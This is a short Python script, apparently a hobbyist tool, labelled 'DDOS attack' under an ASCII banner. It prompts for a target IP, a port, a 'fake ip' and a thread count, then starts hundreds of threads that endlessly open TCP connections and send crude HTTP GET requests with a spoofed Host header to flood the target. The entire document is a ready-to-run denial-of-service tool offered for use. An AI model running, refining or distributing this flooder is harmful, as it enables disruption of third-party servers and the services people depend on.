import socket
import threading

print("""

DDOS attack :
 ____      _          _
|  _ \ ___| |__   ___| |___  ___  ___
| |_) / _ \ '_ \ / _ \ / __|/ _ \/ __|
|  _ <  __/ |_) |  __/ \__ \  __/ (__
|_| \_\___|_.__/ \___|_|___/\___|\___|


""")

target = input("Target ? (8.8.8.8) :")
port = int(input("Port ? (80) :"))
fake_ip = input("fake ip ? :")
threads = int(input("Threads ? (500) :"))
attacked = 0


def attack():
    while True:
        # disini kita akan attack ip sama port nya
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),
                 (target, port))
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),
                 (target, port))
        s.close()

        global attacked
        attacked += 1
        if attacked % threads == 0:
            print(target, "attacked ...")


for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
